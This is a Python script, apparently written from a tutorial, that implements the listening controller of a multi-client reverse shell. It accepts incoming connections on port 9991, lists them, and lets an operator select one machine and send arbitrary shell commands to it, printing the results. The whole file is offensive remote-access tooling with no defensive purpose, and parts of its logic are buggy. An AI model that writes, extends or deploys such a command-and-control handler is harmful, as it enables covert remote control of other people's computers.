# Written by FoxSinOfGreed1729
# Many Thanks to TheNewBoston
import socket
import threading
from queue import Queue
import concurrent.futures
from multiprocessing import Process


# they store connection objects and addresses
all_conn = []
all_addr = []


# Create a socket allowing us to connect to client
def socket_create():
    try:
        global host
        global port
        global s
        host = 'localhost'
        # Host empty coz we're creating a server, the host will connect back
        port = 9991
        # Some Random port
        s = socket.socket()
        # Created the actual socket
    except socket.error as msg:
        print('Error in socket creation' + str(msg))


# now we'll bind the port info to the socket
def socket_bind():
    flag = 0
    try:
        global host
        global port
        global s
        print('Binding socket to port ' + str(port))
        s.bind((host, port))
        s.listen(20)
        # Number of bad connections it'll accept before stopping
    except socket.error as msg:
        print('Socket binding error ' + str(msg))
        print('Retrying......')
        if flag > 5:
            socket_bind()


# Till now, We only listened for connections but now, we'll actually accept the connection
# Establish a connection with client
# Socket needs to be listening to accept connections

def socket_accept():
    s.listen(5)
    conn, addr = s.accept()
    # This will wait until connection has been Established
    print('Connection Established at IP ' + addr[0] + 'And Port ' + str(addr[1]))
    # Addr is info about the connections
    # Conn is a reference to the connection itself
    all_conn.append(conn)
    all_addr.append(addr[0])
    print(all_addr)


# function for interactive prompt
def prompt():
    while True:
        cmd = input("#>")
        if cmd == 'list':
            list_conn()
        elif 'select' in cmd:
            conn_obj = get_tgt(cmd)
        elif cmd == 'connect':
            send_command(conn_obj)
        elif cmd == 'quit':
            return None
        elif cmd == 'help':
            print('list - lists all connections')
            print('select - selects one connection from the table')
            print('connect - connects to the choie selected')
            
        else:
            print('Command not recognized')


def main():
    t1 = threading.Thread(target=part1)
    t2 = threading.Thread(target=part2)
    t1.daemon = True
    t1.start()
    t2.start()


def part1():
    while True:
        socket_create()
        socket_bind()
        socket_accept()


def part2():
    prompt()
    print('Closing all connections, preparing to quit ')
    for conn_obj in all_conn:
        conn_obj.close()
        s.close()
    print("All connections closed quitting")
    exit()
    quit()


def list_conn():
    results = ''
    for i, conn in enumerate(all_conn):
        try:
            # testing for valid connections
            conn.send(str.encode('   '))
            conn.recv(2048)
        except:
            del all_conn[i]
            del all_addr[i]
            continue
        results += str(i) + '    ' + str(all_addr[i]) + '\n'
    print('-----Clients-------')
    print(results)


def get_tgt(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        conn_obj = all_conn[target]
        print("Target selected is    " + str(all_addr[target]))
        return conn_obj
    except:
        print("something went wrong, please try again")
        return None


# Function to send commands
def send_command(conn):
    while True:
        try:
            working_dir = str(conn.recv(2048), "utf-8")
            print(working_dir, end='')
            cmd = input(">>>")
            if cmd == 'quit' or cmd == 'exit':
                conn.send(str.encode("Connection Paused"))
                return None
                # A thing to remember is that stuff that's taken as input isn't bytes
                # It's in byte type so we'll have to convert it to string manually
                # Whenever we want to print it out to the user, it needs to be string
                # Whenever we need to send it over the network, it needs to be bytes
                # All stuff that comes fro the command line or the process itself is bytes
            if len(cmd) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(2048), "utf-8")
                # 2048 is the buffer size and utf is basic character encoding for a string
                print(client_response, end='')
                # the end keyword is to not shift the cursor to a new line
        except:
            print("Something went wrong while remote command execution")

main()

